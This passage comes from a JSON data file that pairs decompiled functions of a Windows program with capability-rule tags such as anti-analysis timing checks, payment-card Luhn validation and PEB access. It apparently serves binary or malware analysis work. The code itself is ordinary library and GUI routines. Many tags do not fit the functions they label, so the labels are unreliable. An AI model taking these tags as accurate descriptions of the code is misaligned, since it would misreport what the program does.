            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.0041bcd0(void)\n\n{\n    uint32_t in_EAX;\n    uchar *puVar1;\n    uint unaff_retaddr;\n    \n    if (in_EAX < 0x1000) {\n        *(&stack0x00000000 + -in_EAX) = unaff_retaddr;\n        return;\n    }\n    puVar1 = &stack0x00000004;\n    do {\n        puVar1 = puVar1 + -0x1000;\n        in_EAX = in_EAX - 0x1000;\n    } while (0xfff < in_EAX);\n    *(puVar1 + (-4 - in_EAX)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 167
    },
    "0041bd29": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041bd29(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_EDI;\n    \n    uVar1 = fcn.0041d585(*0x44af08);\n    if (uVar1 < *0x44af04 + (4 - *0x44af08)) {\n        uVar3 = 0x800;\n        if (uVar1 < 0x800) {\n            uVar3 = uVar1;\n        }\n        iVar2 = fcn.0041c816(*0x44af08, uVar3 + uVar1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.0041c816(*0x44af08, uVar1 + 0x10);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        *0x44af04 = iVar2 + (*0x44af04 - *0x44af08 >> 2) * 4;\n        *0x44af08 = iVar2;\n    }\n    **0x44af04 = unaff_EDI;\n    *0x44af04 = *0x44af04 + 1;\n    return;\n}\n",
        "token_count": 281
    },
    "0041f323": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.0041f323(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *0x44aca8;\n    while( true ) {\n        if (*0x44aca8 + *0x44aca4 * 0x14 <= uVar1) {\n            return 0;\n        }\n        if (param_1 - *(uVar1 + 0xc) < 0x100000) break;\n        uVar1 = uVar1 + 0x14;\n    }\n    return uVar1;\n}\n",
        "token_count": 127
    },
    "0042277a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042277a(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t var_2ch;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    fcn.00424dff(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    fcn.00424cce((0 < arg_10h) + (var_2ch == 0x2d) + arg_ch, arg_10h + 1, &var_2ch);\n    fcn.004226cc(arg_10h, arg_14h, 0);\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 187
    },
    "00422882": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422882(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    fcn.00424dff(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    fcn.00424cce((var_2ch == 0x2d) + arg_ch, var_28h + arg_10h, &var_2ch);\n    fcn.004227e6(arg_ch, arg_10h, 0);\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 181
    },
    "004228e4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004228e4(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    char *arg_8h_00;\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    fcn.00424dff(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    iVar1 = var_28h + -1;\n    arg_8h_00 = (var_2ch == 0x2d) + arg_ch;\n    fcn.00424cce(arg_8h_00, arg_10h, &var_2ch);\n    var_28h = var_28h + -1;\n    if ((var_28h < -4) || (arg_10h <= var_28h)) {\n        fcn.004226cc(arg_10h, arg_14h, 1);\n    }\n    else {\n        if (iVar1 < var_28h) {\n            do {\n                pcVar2 = arg_8h_00;\n                arg_8h_00 = pcVar2 + 1;\n            } while (*pcVar2 != '\\0');\n            pcVar2[-1] = '\\0';\n        }\n        fcn.004227e6(arg_ch, arg_10h, 1);\n    }\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 365
    },
    "004263e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004263e0(char *arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint8_t uVar5;\n    uint32_t uVar4;\n    \n    uVar4 = 0xff;\n    do {\n        do {\n            cVar2 = uVar4;\n            if (cVar2 == '\\0') goto code_r0x00426426;\n            cVar2 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            cVar1 = *arg_8h;\n            uVar4 = CONCAT11(cVar1, cVar2);\n            arg_8h = arg_8h + 1;\n        } while (uVar4 >> 8 == cVar2);\n        uVar3 = cVar1 + 0xbf;\n        uVar3 = uVar3 + (-(uVar3 < 0x1a) & 0x20U) + 0x41;\n        uVar4 = CONCAT11(cVar2 + 0xbfU + (-(cVar2 + 0xbfU < 0x1a) & 0x20U) + 'A', uVar3);\n        uVar5 = uVar4 >> 8;\n    } while (uVar3 == uVar5);\n    cVar2 = (uVar3 < uVar5) * -2 + '\\x01';\ncode_r0x00426426:\n    return cVar2;\n}\n",
        "token_count": 336
    },
    "00426897": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00426897(ushort *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *arg_ch_00;\n    uint var_10h;\n    ushort uStack16;\n    ushort uStack14;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    iVar4 = 0x444d90;\n    if (arg_ch != 0) {\n        if (arg_ch < 0) {\n            arg_ch = -arg_ch;\n            iVar4 = 0x444ef0;\n        }\n        if (arg_10h == 0) {\n            *arg_8h = 0;\n        }\n        while (arg_ch != 0) {\n            uVar1 = arg_ch >> 3;\n            uVar3 = arg_ch & 7;\n            iVar4 = iVar4 + 0x54;\n            arg_ch = uVar1;\n            if (uVar3 != 0) {\n                arg_ch_00 = iVar4 + uVar3 * 0xc;\n                if (0x7fff < *arg_ch_00) {\n                    var_10h._0_2_ = *arg_ch_00;\n                    var_10h._2_2_ = *arg_ch_00 >> 0x10;\n                    uStack16 = arg_ch_00[1];\n                    uStack14 = arg_ch_00[1] >> 0x10;\n                    uStack12 = arg_ch_00[2];\n                    iVar2 = CONCAT22(uStack16, var_10h._2_2_) + -1;\n                    var_10h._2_2_ = iVar2;\n                    uStack16 = iVar2 >> 0x10;\n                    arg_ch_00 = &var_10h;\n                }\n                fcn.00426665(arg_8h, arg_ch_00);\n            }\n        }\n    }\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 479
    },
    "00426d6b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "set environment variable"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00426d6b(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uchar *puVar4;\n    bool bVar5;\n    uint var_10h;\n    uint var_ch;\n    uint lpValue;\n    uint var_4h;\n    \n    var_10h = 0;\n    if (arg_8h == NULL) {\n        return 0xffffffff;\n    }\n    arg_8h_00 = *arg_8h;\n    if (arg_8h_00 == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = fcn.0041c79b(arg_8h_00, 0x3d);\n    if (iVar1 == 0) {\n        return 0xffffffff;\n    }\n    if (arg_8h_00 == iVar1) {\n        return 0xffffffff;\n    }\n    bVar5 = *(iVar1 + 1) == '\\0';\n    if (*0x449658 == *0x44965c) {\n        *0x449658 = fcn.00426d0a();\n    }\n    if (*0x449658 == NULL) {\n        if ((arg_ch != 0) && (*0x449660 != NULL)) {\n            iVar2 = fcn.0042647c();\n            if (iVar2 != 0) {\n                return 0xffffffff;\n            }\n            goto code_r0x00426e20;\n        }\n        if (!bVar5) {\n            *0x449658 = fcn.0041ba5b(4);\n            if (*0x449658 == NULL) {\n                return 0xffffffff;\n            }\n            **0x449658 = 0;\n            if (*0x449660 == NULL) {\n                *0x449660 = fcn.0041ba5b(4);\n                if (*0x449660 == NULL) {\n                    return 0xffffffff;\n                }\n                **0x449660 = 0;\n            }\n            goto code_r0x00426e20;\n        }\ncode_r0x00426dee:\n        var_10h = 0;\n    }\n    else {\ncode_r0x00426e20:\n        piVar3 = *0x449658;\n        iVar2 = fcn.00426cbd(arg_8h_00);\n        if ((iVar2 < 0) || (*piVar3 == 0)) {\n            if (bVar5) {\n                fcn.0041ba6d(arg_8h_00);\n                *arg_8h = 0;\n                goto code_r0x00426dee;\n            }\n            if (iVar2 < 0) {\n                iVar2 = -iVar2;\n            }\n            piVar3 = fcn.0041c816(*0x449658, iVar2 * 4 + 8);\n            if (piVar3 == NULL) {\n                return 0xffffffff;\n            }\n            piVar3[iVar2] = arg_8h_00;\n            (piVar3 + iVar2)[1] = 0;\n            *arg_8h = 0;\ncode_r0x00426ebd:\n            *0x449658 = piVar3;\n        }\n        else {\n            piVar3 = piVar3 + iVar2;\n            fcn.0041ba6d(*piVar3);\n            if (bVar5) {\n                for (; *piVar3 != 0; piVar3 = piVar3 + 1) {\n                    *piVar3 = piVar3[1];\n                    iVar2 = iVar2 + 1;\n                }\n                piVar3 = fcn.0041c816(*0x449658, iVar2 << 2);\n                if (piVar3 != NULL) goto code_r0x00426ebd;\n            }\n            else {\n                *piVar3 = arg_8h_00;\n                *arg_8h = 0;\n            }\n        }\n        if (arg_ch != 0) {\n            iVar2 = fcn.0041c6f0(arg_8h_00);\n            iVar2 = fcn.0041ba5b(iVar2 + 2);\n            if (iVar2 != 0) {\n                fcn.00420ad0(iVar2, arg_8h_00);\n                puVar4 = (iVar2 - arg_8h_00) + iVar1;\n                *puVar4 = 0;\n                iVar1 = (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(iVar2, ~-bVar5 & puVar4 + 1);\n                if (iVar1 == 0) {\n                    var_10h = 0xffffffff;\n                }\n                fcn.0041ba6d(iVar2);\n            }\n        }\n        if (bVar5) {\n            fcn.0041ba6d(arg_8h_00);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 1105
    },
    "00429550": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n\nbool __cdecl\nfcn.00429550(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    char cVar5;\n    bool bVar6;\n    uint var_8h;\n    uint var_ch_2;\n    uint hInstance;\n    uint var_10h;\n    uint var_48h;\n    uint var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint hMem;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = &stack0xffffffb8;\n    *(unaff_EBP + -0x20) = extraout_ECX;\n    if (*(unaff_EBP + 0x10) == 0) {\n        iVar1 = fcn.00431a51();\n        *(unaff_EBP + 0x10) = *(iVar1 + 0xc);\n    }\n    iVar1 = fcn.00431a51();\n    piVar2 = *(iVar1 + 0x1038);\n    *(unaff_EBP + -0x28) = piVar2;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.0042ab0a(0x10);\n    fcn.0042ab0a(0x7c000);\n    if (piVar2 == NULL) {\n        iVar1 = *(unaff_EBP + 8);\ncode_r0x004295d4:\n        if (iVar1 != 0) {\n            piVar2 = fcn.00428235();\n            iVar3 = (**(*piVar2 + 0xc))();\n            *(unaff_EBP + -0x1c) = iVar3 + 0x10;\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x18) = 0;\n            iVar3 = fcn.0042e3c0(iVar1, unaff_EBP + -0x1c, unaff_EBP + -0x18);\n            cVar5 = iVar3 == 0;\n            if (*0x449374 == 0) {\ncode_r0x00429649:\n                if (cVar5 != '\\0') {\ncode_r0x0042964d:\n                    fcn.0042e391(iVar1);\n                    *(unaff_EBP + -4) = 2;\n                    fcn.0042e2f3(*(unaff_EBP + -0x18));\n                    uVar4 = fcn.0042e0a7();\n                    *(unaff_EBP + -0x14) = uVar4;\n                    *(unaff_EBP + -4) = 1;\n                    fcn.0042e099();\n                    if (*(unaff_EBP + -0x14) != 0) {\n                        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(unaff_EBP + -0x14));\n                    }\n                }\n            }\n            else {\n                if (cVar5) goto code_r0x0042964d;\n                iVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x2a);\n                if (iVar3 != 0) {\n                    iVar3 = fcn.0041b056(*(unaff_EBP + -0x1c), \"MS Shell Dlg\");\n                    cVar5 = '\\x01' - (iVar3 != 0);\n                    if (cVar5 != '\\0') {\n                        if (*(unaff_EBP + -0x18) == 8) {\n                            *(unaff_EBP + -0x18) = 0;\n                        }\n                        goto code_r0x00429649;\n                    }\n                }\n            }\n            extraout_ECX[0x10] = -1;\n            extraout_ECX[0xe] = extraout_ECX[0xe] | 0x10;\n            fcn.0042c1a4(extraout_ECX);\n            if (*(unaff_EBP + 0xc) == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = *(*(unaff_EBP + 0xc) + 0x1c);\n            }\n            iVar1 = (*_sym.imp.USER32.dll_CreateDialogIndirectParamA)\n                              (*(unaff_EBP + 0x10), iVar1, uVar4, fcn.00428fe6, 0);\n            fcn.004011b0();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*(unaff_EBP + -0x28) != NULL) {\n                (**(**(unaff_EBP + -0x28) + 0x14))(unaff_EBP + -0x48);\n                if (iVar1 != 0) {\n                    (**(*extraout_ECX + 300))(0);\n                }\n            }\n            iVar3 = fcn.0042af59();\n            if (iVar3 == 0) {\n                (**(*extraout_ECX + 0x114))();\n            }\n            if ((iVar1 != 0) && ((*(extraout_ECX + 0xe) & 0x10) == 0)) {\n                (*_sym.imp.USER32.dll_DestroyWindow)(iVar1);\n                iVar1 = 0;\n            }\n            if (*(unaff_EBP + -0x14) != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*(unaff_EBP + -0x14));\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(*(unaff_EBP + -0x14));\n            }\n            bVar6 = iVar1 != 0;\n            goto code_r0x0042974c;\n        }\n    }\n    else {\n        iVar1 = (**(*extraout_ECX + 300))(unaff_EBP + -0x48);\n        if (iVar1 != 0) {\n            iVar1 = (**(*piVar2 + 0x10))(unaff_EBP + -0x48, *(unaff_EBP + 8));\n            goto code_r0x004295d4;\n        }\n    }\n    bVar6 = false;\ncode_r0x0042974c:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return bVar6;\n}\n",
        "token_count": 1625
    },
    "0042a7a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a7a0(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_60h;\n    uint lprcSrc;\n    int32_t lpPoints;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t lprcDst;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.0042ce20();\n    if (arg_8h == 0) {\n        if ((var_4h & 0x40000000) == 0) {\n            iVar5 = (*_sym.imp.USER32.dll_GetWindow)(*(in_ECX + 0x1c), 4);\n        }\n        else {\n            iVar5 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x1c));\n        }\n        if ((iVar5 != 0) && (iVar4 = (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x36b, 0, 0),  iVar4 != 0)) {\n            iVar5 = iVar4;\n        }\n    }\n    else {\n        iVar5 = *(arg_8h + 0x1c);\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowRect;\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x1c), &var_28h);\n    if ((var_4h & 0x40000000) == 0) {\n        if ((iVar5 != 0) &&\n           ((uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar5, 0xfffffff0),  (uVar2 & 0x10000000) == 0 ||\n            ((uVar2 & 0x20000000) != 0)))) {\n            iVar5 = 0;\n        }\n        if (iVar5 == 0) {\n            iVar5 = fcn.00411a01();\n            if (iVar5 != 0) {\n                iVar5 = *(iVar5 + 0x1c);\n            }\n            uVar3 = fcn.004127a1(iVar5, 1);\n            fcn.0041280c(uVar3, iVar5);\n            pcVar1 = _sym.imp.USER32.dll_CopyRect;\n            (*_sym.imp.USER32.dll_CopyRect)(&lpPoints, &lprcSrc);\n            (*pcVar1)(&lprcDst, &lprcSrc);\n        }\n        else {\n            (*pcVar1)(iVar5, &lpPoints);\n            uVar3 = fcn.004127a1(iVar5, 2);\n            fcn.0041280c(uVar3, iVar5);\n            (*_sym.imp.USER32.dll_CopyRect)(&lprcDst, &lprcSrc);\n        }\n    }\n    else {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x1c));\n        pcVar1 = _sym.imp.USER32.dll_GetClientRect;\n        (*_sym.imp.USER32.dll_GetClientRect)(uVar3, &lprcDst);\n        (*pcVar1)(iVar5, &lpPoints);\n        (*_sym.imp.USER32.dll_MapWindowPoints)(iVar5, uVar3, &lpPoints, 2);\n    }\n    iVar5 = (lpPoints + var_30h) / 2 - (var_20h - var_28h) / 2;\n    iVar4 = (var_34h + var_2ch) / 2 - (var_1ch - var_24h) / 2;\n    if ((lprcDst <= iVar5) && (lprcDst = iVar5,  var_10h < (var_20h - var_28h) + iVar5)) {\n        lprcDst = (var_10h - var_20h) + var_28h;\n    }\n    if ((var_14h <= iVar4) && (var_14h = iVar4,  var_ch < (var_1ch - var_24h) + iVar4)) {\n        var_14h = (var_24h - var_1ch) + var_ch;\n    }\n    fcn.0042d06e(0, lprcDst, var_14h, 0xffffffff, 0xffffffff, 0x15);\n    return;\n}\n",
        "token_count": 1087
    },
    "0042fbe8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042fbe8(uint hWnd, uint lpString2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lpString1;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString2);\n    if (uVar1 < 0x101) {\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, &lpString1, 0x100);\n        if (uVar2 == uVar1) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(&lpString1, lpString2);\n            if (iVar3 == 0) goto code_r0x0042fc43;\n        }\n    }\n    (*_sym.imp.USER32.dll_SetWindowTextA)(hWnd, lpString2);\ncode_r0x0042fc43:\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 234
    },
    "00432ceb": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00432ceb(void)\n\n{\n    uint uVar1;\n    uint var_18h;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetOEMCP)(&var_18h);\n    (*_sym.imp.KERNEL32.dll_GetCPInfo)(uVar1);\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 99
    },
    "00401110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00401110(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint32_t unaff_EDI;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadResource)(param_1, param_2);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    puVar2 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar1);\n    if (puVar2 != NULL) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_SizeofResource)(param_1, param_2);\n        puVar3 = iVar1 + puVar2;\n        for (unaff_EDI = unaff_EDI & 0xf; unaff_EDI != 0; unaff_EDI = unaff_EDI - 1) {\n            if (puVar3 <= puVar2) {\n                return 0;\n            }\n            puVar2 = puVar2 + *puVar2 + 1;\n        }\n        if (puVar2 < puVar3) {\n            return -(*puVar2 != 0) & puVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 277
    },
    "00401170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401170(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(param_1, (param_2 >> 4) + 1 & 0xffff, 6);\n    if (iVar1 == 0) {\n        return;\n    }\n    fcn.00401110(param_1, iVar1, param_2);\n    return;\n}\n",
        "token_count": 105
    },
    "004012c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004012c0(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (**(*param_2 + 0xc))();\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 76
    },
    "004012e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004012e0(int32_t *param_1)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    \n    iVar4 = *param_1;\n    ppiVar1 = iVar4 + -0x10;\n    piVar3 = *ppiVar1;\n    if (*(iVar4 + -0xc) != 0) {\n        piVar2 = iVar4 + -4;\n        if (*(iVar4 + -4) < 0) {\n            if (*(iVar4 + -8) < 0) {\n                fcn.004010f0(0x80070057);\n                iVar4 = extraout_ECX;\n            }\n            *(iVar4 + -0xc) = 0;\n            **param_1 = 0;\n            return;\n        }\n        LOCK();\n        iVar4 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar4 == 1 || iVar4 + -1 < 0) {\n            (**(**ppiVar1 + 4))(ppiVar1);\n        }\n        iVar4 = (**(*piVar3 + 0xc))();\n        *param_1 = iVar4 + 0x10;\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "00401400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401400(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.00428235();\n    iVar2 = (**(*piVar1 + 0xc))();\n    *param_1 = iVar2 + 0x10;\n    return param_1;\n}\n",
        "token_count": 87
    },
    "00401490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00401490(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    uint uVar4;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(param_2, (param_3 >> 4) + 1 & 0xffff, 6);\n    if (iVar2 != 0) {\n        puVar3 = fcn.00401110(param_2, iVar2, param_3);\n        if (puVar3 != NULL) {\n            uVar4 = (**0x4430a0)(0, puVar3 + 1, *puVar3, 0, 0, 0, 0);\n            iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar4);\n            if ((1U - *(*param_1 + -4) | *(*param_1 + -8) - iVar2) < 0) {\n                fcn.00401350(iVar2);\n            }\n            uVar4 = (**0x4430a0)(0, puVar3 + 1, *puVar3, *param_1, iVar2, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar4);\n            if ((-1 < iVar2) && (iVar2 <= *(*param_1 + -8))) {\n                *(*param_1 + -0xc) = iVar2;\n                *(iVar2 + *param_1) = 0;\n                return 1;\n            }\n            fcn.004010f0(0x80070057);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 418
    },
    "00401800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401800(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t *piVar4;\n    \n    iVar1 = *param_1;\n    iVar2 = *(iVar1 + -0xc);\n    if ((1U - *(iVar1 + -4) | *(iVar1 + -8) - iVar2) < 0) {\n        fcn.00401350(iVar2);\n    }\n    fcn.0041afd1(*param_1);\n    if ((-1 < iVar2) && (iVar2 <= *(*param_1 + -8))) {\n        *(*param_1 + -0xc) = iVar2;\n        *(iVar2 + *param_1) = 0;\n        return param_1;\n    }\n    fcn.004010f0(0x80070057);\n    pcVar3 = swi(3);\n    piVar4 = (*pcVar3)();\n    return piVar4;\n}\n",
        "token_count": 231
    },
    "00401aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "PEB access",
            "access PEB ldr_data"
        ],
        "decompiled_code": "\nint32_t * fcn.00401aa0(int32_t *param_1, int32_t *param_2, int32_t *param_3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **ppiVar5;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    piVar1 = param_2;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x434ca8;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    piVar2 = (**(**(*param_2 + -0x10) + 0x10))();\n    iVar3 = (**(*piVar2 + 0xc))();\n    param_2 = iVar3 + 0x10;\n    uStack4 = 0;\n    fcn.00401860(&param_2, *piVar1, *(*piVar1 + -0xc), *param_3, *(*param_3 + -0xc));\n    iVar3 = param_2;\n    ppiVar5 = param_2 + -0x10;\n    iVar4 = fcn.004013a0(ppiVar5);\n    *param_1 = iVar4 + 0x10;\n    uStack4 = 0xffffffff;\n    piVar1 = iVar3 + -4;\n    LOCK();\n    iVar3 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar3 == 1 || iVar3 + -1 < 0) {\n        (**(**ppiVar5 + 4))(ppiVar5);\n    }\n    *in_FS_OFFSET = uStack12;\n    return param_1;\n}\n",
        "token_count": 405
    },
    "00401b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
